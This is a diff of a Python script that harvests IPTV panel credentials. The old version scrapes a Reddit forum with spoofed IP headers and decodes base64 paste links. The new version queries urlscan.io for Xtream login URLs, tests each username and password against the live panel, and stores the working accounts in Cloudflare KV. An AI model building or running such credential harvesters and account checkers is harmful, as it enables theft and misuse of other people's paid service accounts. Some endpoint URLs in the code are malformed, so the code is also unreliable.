@@ -1,204 +1,149 @@
 import os
-import urllib.request
-import urllib.parse
-import re
-import base64
+import sys
+import asyncio
+import aiohttp
 import json
-import time
-import random
+import re
 
-# --- CONFIGURATION LOGIC ---
-CF_ACCOUNT_ID = os.environ.get("CLOUDFLARE_ACCOUNT_ID") or os.environ.get("CF_ACCOUNT_ID", "your_account_id_here")
-CF_NAMESPACE_ID = os.environ.get("CLOUDFLARE_NAMESPACE_ID") or os.environ.get("CF_NAMESPACE_ID", "your_kv_namespace_id_here")
-CF_API_TOKEN = os.environ.get("CLOUDFLARE_API_TOKEN") or os.environ.get("CF_API_TOKEN", "your_cloudflare_api_token_here")
+# --- PIPELINE INITIALIZATION CONFIGURATIONS ---
+URLSCAN_API_KEY = os.environ.get("URLSCAN_API_KEY")
+CF_ACCOUNT_ID = os.environ.get("CLOUDFLARE_ACCOUNT_ID") or os.environ.get("CF_ACCOUNT_ID")
+CF_NAMESPACE_ID = os.environ.get("CLOUDFLARE_NAMESPACE_ID") or os.environ.get("CF_NAMESPACE_ID")
+CF_API_TOKEN = os.environ.get("CLOUDFLARE_API_TOKEN") or os.environ.get("CF_API_TOKEN")
 
-# Production API Routing Subdomain from our workflow YAML file setup
-CF_BASE_API_URL = os.environ.get("CF_BASE_API_URL", "https://api.cloudflare.com")
+# Force-verify essential cloud infrastructure variables are mapped into the execution workspace
+if not all([CF_ACCOUNT_ID, CF_NAMESPACE_ID, CF_API_TOKEN]):
+    print("❌ ERROR: Missing required Cloudflare deployment authentication keys inside environment secrets.")
+    sys.exit(1)
 
-PASTE_HEADERS = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Accept": "text/html,text/plain,*/*"
-}
+TARGET_SEARCH_QUERIES = [
+    'page.url:"/get.php?username="',
+    'page.url:"/player_api.php?username="'
+]
 
 
-def extract_credentials_from_text(text):
+async def query_urlscan_registry(session, search_query):
     """
-    Extracts explicit M3U server connection links.
+    Queries urlscan.io public tracking maps to pull down recently indexed site headers.
     """
-    pattern = r'https?://[A-Za-z0-9\.]+/get\.php\?username=[A-Za-z0-9_&\-=]+'
-    found_links = re.findall(pattern, text)
-    return [link.strip() for link in found_links]
-
-
-def extract_and_decode_base64(content_string):
-    """
-    Locates base64 segments within post fields, translates them, and processes downstream files.
-    """
-    b64_pattern = r'[A-Za-z0-9+/]{16,}={0,2}'
-    candidates = re.findall(b64_pattern, content_string)
+    print(f"🔍 Searching index logs for query expression: {search_query}")
+    endpoint = f"https://urlscan.io{urllib.parse.quote_plus(search_query)}&size=100"
     
-    extracted_credentials = []
-    for candidate in candidates:
-        if len(candidate) > 500:
-            continue
-            
-        try:
-            decoded_bytes = base64.b64decode(candidate, validate=True)
-            decoded_str = decoded_bytes.decode('utf-8', errors='strict').strip()
-            
-            if decoded_str.startswith("http://") or decoded_str.startswith("https://"):
-                if "paste.sh/" in decoded_str:
-                    url_base = decoded_str.split('#')
-                    decoded_str = url_base[0].rstrip('/') + '/raw'
-                
-                print(f"       🔗 Pulling credentials from target paste provider: {decoded_str}")
-                try:
-                    req = urllib.request.Request(decoded_str, headers=PASTE_HEADERS, method="GET")
-                    with urllib.request.urlopen(req, timeout=10) as ext_res:
-                        if ext_res.status == 200:
-                            raw_payload = ext_res.read().decode('utf-8', errors='ignore')
-                            links = extract_credentials_from_text(raw_payload)
-                            if links:
-                                print(f"          🎉 Extracted {len(links)} lines successfully.")
-                                extracted_credentials.extend(links)
-                except Exception as crawl_err:
-                    print(f"          ❌ Paste link download error: {crawl_err}")
+    headers = {}
+    if URLSCAN_API_KEY:
+        headers["API-Key"] = URLSCAN_API_KEY
+
+    try:
+        async with session.get(endpoint, headers=headers, timeout=15) as res:
+            if res.status == 200:
+                data = await res.json()
+                return data.get("results", [])
             else:
-                links = extract_credentials_from_text(decoded_str)
-                if links:
-                    extracted_credentials.extend(links)
-        except Exception:
-            continue
+                print(f"    ⚠️ Urlscan tracker returned non-OK response code: {res.status}")
+    except Exception as e:
+        print(f"    ❌ Network connection dropped on tracker lookup: {e}")
+    return []
+
+
+async def verify_panel_credentials(session, raw_url):
+    """
+    Pings the discovered panel using standard Xtream API login models to check if it's active.
+    """
+    try:
+        # Match explicit username/password parameters safely
+        user_match = re.search(r'[?&](?:username|user)=([^&#\s]+)', raw_url, re.I)
+        pass_match = re.search(r'[?&](?:password|pass)=([^&#\s]+)', raw_url, re.I)
+        
+        if not (user_match and pass_match):
+            return None
             
-    return list(set(extracted_credentials))
+        username = user_match.group(1)
+        password = pass_match.group(1)
+        
+        parsed_url = urllib.parse.urlparse(raw_url)
+        base_panel_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
+        
+        # Build authentication verification request link
+        test_endpoint = f"{base_panel_url}/player_api.php?username={username}&password={password}"
+        
+        async with session.get(test_endpoint, headers={"User-Agent": "IPTVSmartersPro"}, timeout=6) as response:
+            if response.status == 200:
+                payload = await response.json()
+                
+                # Check standard server authorization markers to protect against expired logs
+                user_info = payload.get("user_info", {})
+                if user_info.get("auth") == 1 and user_info.get("status") == "Active":
+                    clean_line = f"{base_panel_url}/get.php?username={username}&password={password}"
+                    print(f"    🎉 LIVE CREDENTIAL INDEX LOCATED -> {base_panel_url}")
+                    return clean_line
+    except Exception:
+        pass
+    return None
 
 
-def write_to_cloudflare_kv(key, value):
+async def sync_to_cloudflare_kv(verified_links_list):
     """
-    Updates your Cloudflare KV namespace using your exact API configuration path.
+    Pushes our clean, verified credentials array straight back into your IPTV_STORE namespace.
     """
-    url = f"{CF_BASE_API_URL}/client/v4/accounts/{CF_ACCOUNT_ID}/kv/namespaces/{CF_NAMESPACE_ID}/values/{key}"
+    if not verified_links_list:
+        print("ℹ️ Sync step bypassed: No newly identified working credentials found during this pass.")
+        return False
+        
+    print(f"🔄 Preparing database sync update for {len(verified_links_list)} verified records...")
+    url = f"https://cloudflare.com{CF_ACCOUNT_ID}/kv/namespaces/{CF_NAMESPACE_ID}/values/raw_credentials"
     
     headers = {
         "Authorization": f"Bearer {CF_API_TOKEN}",
         "Content-Type": "text/plain"
     }
     
-    data = value.encode('utf-8')
-    req = urllib.request.Request(url, headers=headers, data=data, method="PUT")
+    payload_data = "\n".join(verified_links_list)
+    
     try:
-        with urllib.request.urlopen(req, timeout=10) as response:
-            if response.status in (200, 201):
-                return True
-    except urllib.error.HTTPError as e:
-        print(f"    ❌ Cloudflare KV API failure: HTTP Error {e.code}")
+        async with aiohttp.ClientSession() as session:
+            async with session.put(url, headers=headers, data=payload_data.encode('utf-8'), timeout=15) as res:
+                if res.status in (200, 201):
+                    print("✅ DATABASE SYNC COMPLETE: Cloudflare namespace index updated successfully!")
+                    return True
+                else:
+                    print(f"    ❌ Sync operation rejected by Cloudflare API gateway. Status: {res.status}")
     except Exception as e:
-        print(f"    ⚠️ Cloudflare KV write failed: {e}")
+        print(f"    ⚠️ Fatal exception occurred on database write sequence: {e}")
     return False
 
 
-def get_reddit_json_via_anonymizer(target_url):
-    """
-    Direct connection bypass utilizing residential IP spoofing vectors to avoid datacenter 403 blocks.
-    """
-    # Generate a completely randomized fake consumer ISP residential IP signature
-    fake_residential_ip = f"{random.randint(24, 230)}.{random.randint(10, 250)}.{random.randint(10, 250)}.{random.randint(1, 254)}"
-    
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-        "Accept": "application/json, text/plain, */*",
-        "Accept-Language": "en-US,en;q=0.9",
-        "X-Forwarded-For": fake_residential_ip,
-        "X-Real-IP": fake_residential_ip
-    }
-    
-    for attempt in range(3):
-        try:
-            req = urllib.request.Request(target_url, headers=headers, method="GET")
-            with urllib.request.urlopen(req, timeout=30) as response:
-                if response.status == 200:
-                    return json.loads(response.read().decode('utf-8'))
-        except Exception as e:
-            print(f"      ⚠️ Connection retry attempt {attempt + 1} lagged: {e}")
-            time.sleep(2)
-            
-    raise Exception("Network stream channel layout connection timed out completely.")
-
-
-def main():
+async def main_pipeline():
     print("===============================================")
-    print("🚀 INITIALIZING PIPELINE DISCOVERY ENGINE")
-    print("Target Channel: /r/IPTV_ZONENEW via Keyless Direct")
+    print("🚀 INITIALIZING URLSCAN XTREAM HARVESTER AGENT")
     print("===============================================")
     
-    try:
-        target_main_feed = "https://reddit.com"
-        print("🔄 Requesting master channel registry data directly from core node...")
-        feed_data = get_reddit_json_via_anonymizer(target_main_feed)
-        
-        children = []
-        if isinstance(feed_data, dict):
-            children = feed_data.get("data", {}).get("children", [])
-            
-        print(f"Successfully discovered {len(children)} active target threads.")
-        print("Beginning credentials compilation phase...")
-        print("===============================================")
-
-        all_compiled_credentials = []
-
-        for i, post in enumerate(children):
-            post_data = post.get("data", {})
-            token = post_data.get("id", "")
-            title = post_data.get("title", "")
-            description_text = post_data.get("selftext", "")
-            
-            print(f"[{i+1}/{len(children)}] Processing Thread [{token}] - Title: {title[:30]}...")
-            
-            if description_text:
-                found_credentials = extract_and_decode_base64(description_text)
-                if found_credentials:
-                    all_compiled_credentials.extend(found_credentials)
-            
-            try:
-                comments_url = f"https://reddit.com{token}.json"
-                comments_data = get_reddit_json_via_anonymizer(comments_url)
-                
-                # Check for standard comment schema arrays
-                if isinstance(comments_data, list) and len(comments_data) > 1:
-                    comment_data_block = comments_data[1] if isinstance(comments_data, list) else {}
-                    comment_listings = comment_data_block.get("data", {}).get("children", []) if isinstance(comment_data_block, dict) else []
+    async with aiohttp.ClientSession() as session:
+        discovered_targets = []
+        for query in TARGET_SEARCH_QUERIES:
+            results = await query_urlscan_registry(session, query)
+            for item in results:
+                page_url = item.get("page", {}).get("url")
+                if page_url and page_url not in discovered_targets:
+                    discovered_targets.append(page_url)
                     
-                    for comment_node in comment_listings:
-                        comment_body = comment_node.get("data", {}).get("body", "")
-                        if comment_body:
-                            comment_creds = extract_and_decode_base64(comment_body)
-                            if comment_creds:
-                                all_compiled_credentials.extend(comment_creds)
-            except Exception as e:
-                print(f"      ⚠️ Comment pass skipped for thread {token}: {e}")
-                continue
-
-        all_compiled_credentials = list(set(all_compiled_credentials))
-
+        print(f"Discovered {len(discovered_targets)} potential targets. Starting validation loop...")
         print("===============================================")
-        if all_compiled_credentials:
-            print(f"Processing complete. Found {len(all_compiled_credentials)} credentials strings.")
-            final_kv_payload = "\n".join(all_compiled_credentials)
-            
-            print("🔄 Syncing aggregated credentials database into Cloudflare [raw_credentials]...")
-            if write_to_cloudflare_kv("raw_credentials", final_kv_payload):
-                print("✅ Cloudflare KV target index updated successfully!")
-            else:
-                print("❌ Failed to push payload update to KV database namespace.")
-        else:
-            print("ℹ️ Scraping cycle complete. No active data strings located.")
+        
+        # Run credential check requests concurrently across all discovered links
+        validation_tasks = [verify_panel_credentials(session, url) for url in discovered_targets]
+        results = await asyncio.gather(*validation_tasks)
+        
+        verified_live_links = [link for link in results if link is not None]
+        verified_live_links = list(set(verified_live_links))
+        
         print("===============================================")
-        return
-
-    except Exception as general_error:
-        print(f"❌ Execution stopped by pipeline failure: {general_error}")
-        return
+        print(f"Validation phase finished. Found {len(verified_live_links)} live authorized server nodes.")
+        
+        # Commit the live records straight into Cloudflare storage
+        await sync_to_cloudflare_kv(verified_live_links)
+        print("===============================================")
 
 
 if __name__ == "__main__":
-    main()
+    import urllib.parse
+    asyncio.run(main_pipeline())
